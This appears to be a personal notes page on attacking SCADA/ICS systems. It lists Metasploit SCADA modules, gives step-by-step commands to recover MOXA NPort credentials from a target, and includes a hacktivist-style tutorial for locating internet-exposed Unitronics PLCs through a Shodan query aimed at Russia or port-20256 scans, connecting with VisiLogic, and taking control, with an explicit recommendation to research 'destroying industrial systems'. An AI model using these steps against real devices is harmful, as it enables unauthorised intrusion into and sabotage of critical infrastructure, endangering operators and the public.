# SCADA

## 01 - Metasploit

TODO: Go through each and every MSF module related to SCADA/ICS

```
auxiliary/analyze/modbus_zip

auxiliary/scanner/scada/modbus_banner_grabbing

auxiliary/scanner/scada/modbusclient

auxiliary/scanner/scada/modbus_findunitid

auxiliary/scanner/scada/modbusdetect

auxiliary/scanner/scada/pcomclient

auxiliary/admin/scada/modicon_stux_transfer

auxiliary/admin/scada/modicon_command
```

- Gather MOXA NPort credentials when authentication is on.

```
msf > use auxiliary/admin/scada/moxa_credentials_recovery

msf auxiliary(admin/scada/moxa_credentials_recovery) > options

msf auxiliary(admin/scada/moxa_credentials_recovery) > set function creds

msf auxiliary(admin/scada/moxa_credentials_recovery) > set rport 4800

msf auxiliary(admin/scada/moxa_credentials_recovery) > set rhosts <target_IP>

msf auxiliary(admin/scada/moxa_credentials_recovery) > run
```

## Unitronic PLCs

Unitronics devices, some of our recent ICS attacks had a new approach that shocked a few people and we got some questions on it was the targets where we showed off the HMI's for them.

Those are Unitronics Device this writeup will be a tutorial on how you can also access and breach these devices

Lets start with finding these devices there are 2 ways:

1. The typical shodan way, one dork you can use to find it (country:"ru" unitronics) or you can gather a bunch of CIDR and make a access control list using this https://www.countryipblocks.net/acl.php then scan the ranges for port 20256

Once thats done let's install the required program to remotely connect to the unitronics devices https://www.unitronicsplc.com/software-visilogic-for-programmable-controllers/

Now how to connect? You open visilogic and head to the connection tab and then press the last option (communication and os) from there set the connection type to TCP call and configure the project settings 

Now you see this scary panel? well don't be scared. For IP address that's self explanatory which is the target. The port is whatever the targets port is. Now for the PLC name. THIS STEP IS NECESSARY!

Be it shodan or your scans you will usually have the PLC name INSERT THAT THE EXACT WAY ITS WRITTEN IN YOUR RESULTS

After that press okay and once back on the communication and OS page, press get OPLC information if you see the information loaded its safe to close the tab out now go back to connection and press online test or simply press F9 on your keyboard.

Once that's done you can press the (play button) and you officially accessed the unitronics PLC

From here we do recommend research on using this software and how to properly achieve what you want and destroying industrial systems (Via videos or the same download link from above check out the manual, etc etc)

HACK THE PLANET!!

ANY QUESTIONS DROP THEM IN THE CHAT

---
## References

- [[SCADA (ICS)|Shodan: SCADA]]